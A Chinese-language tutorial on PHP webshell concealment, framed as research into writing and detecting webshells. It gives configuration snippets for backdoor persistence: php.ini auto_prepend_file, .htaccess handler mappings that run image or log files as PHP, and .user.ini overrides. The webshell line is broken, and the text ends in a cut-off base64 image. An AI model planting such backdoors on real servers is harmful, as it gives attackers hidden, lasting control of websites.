# PHP Webshell Hidden Learning

## **1. 引言**

本文旨在研究Webshell的各种猥琐编写方式以及webshell后门的生成、检测技术，主要分享了一些webshell的编写方法以及当前对webshell的识别、检测技术的原理以及相应工具的使用，希望能给研究这一领域的朋友带来一点点帮助，同时抛砖引玉，和大家共同讨论更多的技术细节，共同学习成长

**Relevant Link:**

> http://www.sec-un.org/webshell-security-testing-1-based-traffic-detection.html  
> http://www.sec-un.org/webshell-security-testing-2-go-deep-inside-the-user.html  
> http://www.sec-un.org/webshell-security-detection-3-based-on-behavioral-analysis-to-discover-unknown-webshell.html  
> http://www.sec-un.org/webshell-security-testing-4-webshell-based-on-flow-analysis-sample.html  
> http://www.sec-un.org/webshell-5-webshell-see-capacity-analysis.html  
> http://hi.baidu.com/monyer/item/a218dbadf2afc7a828ce9d63  
> http://drops.wooyun.org/tips/839  
> http://1.lanz.sinaapp.com/?p=3  
> http://www.thespanner.co.uk/2011/09/22/non-alphanumeric-code-in-php/  
> http://blog.sucuri.net/2011/09/ask-sucuri-what-about-the-backdoors.html  
> http://www.php-security.org/2010/05/20/mops-submission-07-our-dynamic-php/index.html  
> http://www.freebuf.com/articles/web/11403.html  
> http://zone.wooyun.org/content/5429  
> https://www.virustotal.com/  
> http://www.8090sec.com/suixinbiji/111568.html  
> http://blog.d99net.net/article.asp?id=435  
> http://www.91ri.org/10146.html  
> http://1.lanz.sinaapp.com/?p=3  
> http://www.thespanner.co.uk/2011/09/22/non-alphanumeric-code-in-php/  
> http://blog.sucuri.net/2011/09/ask-sucuri-what-about-the-backdoors.html  
> http://www.php-security.org/2010/05/20/mops-submission-07-our-dynamic-php/index.html  
> http://www.freebuf.com/articles/web/11403.html  
> http://zone.wooyun.org/content/5429  
> https://www.virustotal.com/  
> http://www.8090sec.com/suixinbiji/111568.html  
> http://blog.d99net.net/article.asp?id=435  
> http://www.91ri.org/10146.html

## **2. webshell原理介绍**

来自百度百科的定义:

WebShell就是以asp、php、jsp或者cgi等网页文件形式存在的一种命令执行环境，也可以将其称做为一种网页后门。黑客在入侵了一个网站后，通常会将这些asp或php后门文件与网站服务器

WEB目录下正常的网页文件混在一起，然后就可以使用浏览器来访问这些asp或者php后门，得到一个命令执行环境，以达到控制网站服务器的目的（可以上传下载文件，查看数据库，执行任意程序命令等）

也就是说，webshell也就是一些"正常"的脚本文件\(这里说它正常，是从文本的角度来说的\)，而webshell的恶意性则是表现在它的实现功能上的，也叫Back Door，是一段带有恶意目的的正常脚本代码\(Mareware\)

在开始学习webshell的各种奇技淫巧之前，我们要先了解一个基本概念，即webshell的组成，下面是引用Monyer的一篇文章:

![](../../../.gitbook/assets/image%20%28619%29.png)

还有一张是来自drops的一篇paper:

![](../../../.gitbook/assets/image%20%28618%29.png)

即不管webshell的外形怎么改变，它的基本骨架都符合这个结构，即WebShell的实现需要两步：

根据这两个基本点，webshell可以衍生出很多种写法

1、数据的传递:

> 1. $\_GET、$\_POST、$\_COOKIES、$\_FILE...\(HTTP包中的任何位置都可以作为payload的传输媒介
> 2. 从远程远程URL中获取数据: file\_get\_contents、curl、svn\_checkout...\(将需要执行的指令数据放在远程URL中，通过URL\_INCLUDE来读取\)
> 3. 从磁盘文件中获取数据: file、file\_get\_contents...\(将需要执行的指令数据放在磁盘文件中，利用IO函数来读取\)
> 4. 从数据库中读取\(将需要执行的指令放在数据库中，利用数据库函数来读取\)
> 5. 从图片头部中获取: exif\_read\_data...\(将需要执行的指令数据放在图片头部中，利用图片操作函数来读取\)

2、代码执行\(将用户传输的数据进行执行\)

> 1. eva、system...l执行\(这是最普通、标准的代码执行\)
> 2. LFI: include、require...\(利用浏览器的伪协议将文件包含转化为代码执行\)
> 3. 动态函数执行\($\(\)...PHP的动态函数特性\)
> 4. Curly Syntax\(${${...}}...这种思路可以把变量赋值的漏洞转化为代码执行的机会\)

关于webshell的防御，这里我的理解应该做一下区分:

webshell有三大类的问题:

> 1. 由一些CMS应用系统的漏洞导致的getshell，攻击者在注入攻击的那一瞬间进行getshell，这类webshell的防御主要是在对原有应用系统的代码审查上，审核原有的应用系统的代码中是否存在可能导致getshell的"不安全代码"
> 2. 对攻击者写入的webshell代码本身的检测，我们需要了解黑客都会使用哪些种类的奇技淫巧的webshell编写方式，并对这类文件的操作行为进行监控并进行报告
> 3. 还有一种假设的前提是黑客已经获得了一定的对目标服务器的控制权限，黑客为了后续的访问，会留下逻辑后门。这种逻辑后门可以很宽泛的理解一下: 
>
> > 1. 人工故意放置一个带注入点的文件，并放上正常的文件内容，增加迷惑性，让扫描工具工具和管理员看起来像正常文件
> > 2. 修改服务器配置文件：
> >    1. .htaceess，修改某些扩展名的执行权\(例如手工添加 .fackType PHP 这种映射关键的建立\).SetHandler application/x-httpd-php: 添加jpg和PHP解析引擎的映射
> >    2. 建立一种逻辑后门。或在php.ini中设置auto\_preload来预加载.php脚本，放置后门代码
> >    3. 修改CMS的配置，放行某些\(.php、.asp\)的上传权限
> >    4. 人工设置几个包含容易导致漏洞的代码的脚本文件\(LFI、命令执行等\)

## **3.  webshell的常见类型以及变种方法**

### 0x1:  php.ini隐藏后门

这是php的核心配置文件

```text
在php.ini 中添加:

; Automatically add files before PHP document.
; http://php.net/auto-prepend-file
auto_prepend_file = choop.php
; (auto_prepend_file是在任意PHP脚本的头部)
; (auto_append_file是在任意PHP脚本的尾部)
; (不管头部还是尾部，webshell都能被正常执行)

; LittleHann
include_path = "E:\wamp\www\shell;."
;我们所要include的文件目录放在根目录的前边。不然的话apache会在根目录下搜索我们的后门(当然是没有了从而导致服务器解析php文件失败)

在"E:\wamp\www\shell"中创建 choop.php: 1]); ?>
这样可以将webshell藏在磁盘上的任意位置，不一定是要web目录，然后在整个服务器运行期间放置后门
```

对于这种利用php.ini的webshell部署攻击方式，我们在做攻防研究的时候一定要明白它的攻防场景，一般来说，只有黑客具有了远程修改文件或者已经拿到了目标主机的权限，为了之后的隐蔽访问，而采取的在php.ini中部署一个"后门"，也就是说这种webshell部署更倾向于后门的目的

### 0x2:  .htaccess文件构成的PHP后门

.htaccess是apache的分布式配置文件，.htaccess文件\(或者"分布式配置文件"\)提供了针对不同WEB应用对应的子目录改变配置的方法

```text
.htaccess files (or "distributed configuration files") provide a way to make configuration changes on a per-directory basis. A file, containing one or more configuration directives, is placed in a particular document directory, and the directives apply to that directory, and all subdirectories thereof.
```

.htaccess文件可以看成是apache核心配置文件的一个子集，按照"就近原则"，.htaccess中的指令可以对httpd.conf进行覆盖，前提是httpd.conf中开启了允许覆盖的开关

在.htaccess中有很多"指令"，详细的指令作用可以参阅官方给出的doc，这里我们重点学习和部署后门WEBSHELL有关的以下几条指令

```text
1. AddHandler
http://httpd.apache.org/docs/2.2/mod/mod_mime.html#addhandler
    1) Description: Maps the filename extensions to the specified handler
    2) Syntax: AddHandler handler-name extension [extension] ...
    3) Context: server config, virtual host, directory, .htaccess
    4) Override: FileInfo
    5) Status: Base
    6) Module: mod_mime
example: AddHandler php5-script .logs
将对.logs的后缀文件解析映射到PHP脚本解析器上

2. AddType
http://httpd.apache.org/docs/2.2/mod/mod_mime.html#addhandler
    1) Description:    Maps the given filename extensions onto the specified content type
    2) Syntax: AddType MIME-type extension [extension] ...
    3) Context: server config, virtual host, directory, .htaccess
    4) Override: FileInfo
    5) Status: Base
    6) Module: mod_mime
example: AddType text/html .logs
指定了.logs的后缀的文件的文件扩展类型为"text/html"，这决定了PHP解析这个文件的方式

3. SetHandler
http://httpd.apache.org/docs/2.2/mod/core.html#sethandler
    1) Description:    Forces all matching files to be processed by a handler
    2) Syntax: SetHandler handler-name|None
    3) Context: server config, virtual host, directory, .htaccess
    4) Override: FileInfo
    5) Status: Core
    6) Module: core
    7) Compatibility: Moved into the core in Apache 2.0
example: SetHandler application/x-httpd-php
将所有脚本请求都强制指定为使用"application/x-httpd-php"进行解析
```

基于对以上知识的了解，我们来看几种GETSHELL、部署、隐藏WEBSHELL的方式

```text
1. SetHandler
可将php代码存于非php后缀文件，例: x.jpg
将以下代码写入.htaccess中
SetHandler application/x-httpd-php
连接x.jpg即可启动后门木马
http://26836659.blogcn.com/articles/利用-htaccess文件来执行php脚本.html

2. AddHandler、AddType
可将php代码存于非php后缀文件，例: x.logs
将以下代码写入.htaccess中
AddHandler php5-script .logs
AddType text/html .logs
连接x.logs，此时x.logs会被apache当成PHP脚本进行解析

3. php_value
将以下代码写入.htaccess中, 文件路径必须是绝对路径，访问网站上任何php文件都会启动该php后门木马
php_value auto_append_file E:/wamp/www/choop.php
```

_**Relevant Link:**_

```text
https://github.com/sektioneins/pcc/wiki/PHP-htaccess-injection-cheat-sheet
http://zone.wooyun.org/content/16114
http://httpd.apache.org/docs/2.2/howto/htaccess.html
```

### 0x3:  .user.ini文件构成的PHP后门

.user.ini是php应用的分布式配置文件

和.htaccess的利用思想是一样的，.user.ini也利用分布式的自定义配置文件、从而进行"配置覆盖、劫持"，从而bypass原本的防御逻辑的攻击思想

```text
1. 自PHP 5.3.0起，PHP支持基于每个目录的".htaccess风格"的"INI文件"。此类文件仅被CGI/FastCGI SAPI处理。此功能使得PECL的 htscanner扩展作废。如果使用Apache，则用.htaccess 文件有同样效果 

2. 除了主php.ini之外，PHP还会在每个目录下扫描INI文件，从被执行的PHP文件所在目录开始一直上升到web根目录($_SERVER['DOCUMENT_ROOT'] 所指定的)。如果被执行的PHP文件在web根目录之外，则只扫描该目录。

3. 在.user.ini风格的INI文件中只有具有
    1) PHP_INI_PERDIR
    2) PHP_INI_USER
模式的INI设置可被识别 

4. 两个新的INI指令
    1) user_ini.filename
    2) user_ini.cache_ttl
控制着用户INI文件的使用 

5. user_ini.filename设定了PHP会在每个目录下搜寻的文件名
    1) 如果设定为空字符串则PHP不会搜寻
    2) 默认值是: .user.ini 

6. user_ini.cache_ttl控制着重新读取用户INI文件的间隔时间
    1) 默认是300秒
```

需要注意的是，对于.user.ini这种分布式的配置文件来说，它可以使用的指令集是有限制的

```text
http://php.net/manual/zh/configuration.changes.modes.php
```

在.user.ini风格的INI文件中只有具有"PHP\_INI\_PERDIR"和"PHP\_INI\_USER"模式的INI设置可被识别，由此我们可以知道，"`.user.ini"`实际上就是一个可以由用户“自定义”的php.ini，我们能够自定义的设置是模式为"PHP\_INI\_PERDIR、PHP\_INI\_USER"的设置

在我们能够自定义的配置指令中，我们可以发现如下几条指令可以被用来进行webshell的部署

![](data:image/png;base64,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